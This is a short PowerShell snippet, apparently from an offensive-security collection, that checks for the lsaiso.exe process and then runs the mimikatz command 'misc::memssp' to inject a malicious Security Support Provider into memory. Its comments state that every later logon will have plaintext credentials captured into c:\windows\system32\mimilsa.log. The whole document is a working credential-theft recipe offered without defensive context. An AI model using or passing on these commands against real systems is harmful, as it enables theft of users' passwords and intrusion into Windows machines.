# Code Snippet 45f3d928

**Language**: Powershell

```powershell
# Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

# Lets inject our own malicious Security Support Provider into memory
# require mimilib.dll in the same folder
mimikatz # misc::memssp

# Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
```
